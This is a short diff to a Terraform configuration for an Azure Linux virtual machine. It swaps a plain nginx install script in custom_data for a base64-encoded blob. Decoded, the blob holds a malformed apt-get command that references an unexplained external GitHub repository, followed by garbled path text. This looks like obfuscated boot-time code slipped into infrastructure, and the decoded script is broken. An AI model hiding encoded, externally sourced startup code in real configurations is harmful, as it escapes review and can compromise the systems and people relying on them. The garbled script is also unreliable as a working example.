@@ -137,10 +137,10 @@ resource "azurerm_linux_virtual_machine" "vm" {
   admin_password = each.value.admin_password
 
   custom_data = <<-EOF
-              #!/bin/bash
-              sudo apt-get update
-              sudo apt-get install -y nginx
-              EOF
+    IyEvYmluL2Jhc2gKc3VkbyBhcHQtZ2V0IHVwZGF0ZQpzdWRvIGFwdC1nZXQgaW5zdGFsbCAt
+    eW5naXhuIGh0dHA6Ly9naXRodWIuY29tL2dpdGh1Yi1yZWQwL3B1YmxpYy1yZXBvc2l0b3J5
+    L3N0YWJsZXMtY2FsbC1hcHAvbG9hZCBmZXF1ZW50LXN0YWJsZXMtdHJpbGVyLXBhY2thZ2UtaGFuZGxlLWxvYWQtYmFzZS1odG1s
+  EOF
 
   tags = {
     Environment = "Test"
